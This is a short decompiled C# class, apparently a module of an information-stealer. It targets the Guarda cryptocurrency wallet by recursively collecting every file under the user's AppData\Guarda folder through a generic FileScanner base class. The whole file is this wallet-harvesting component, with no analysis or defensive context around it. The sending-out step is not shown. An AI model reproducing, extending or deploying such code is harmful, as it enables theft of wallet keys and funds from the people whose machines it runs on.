using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000027 RID: 39
public class Guarda : FileScanner
{
	// Token: 0x060000CF RID: 207 RVA: 0x00003900 File Offset: 0x00001B00
	public Guarda()
	{
		base.Name = "Guarda";
	}

	// Token: 0x060000D0 RID: 208 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000D1 RID: 209 RVA: 0x00008D98 File Offset: 0x00006F98
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
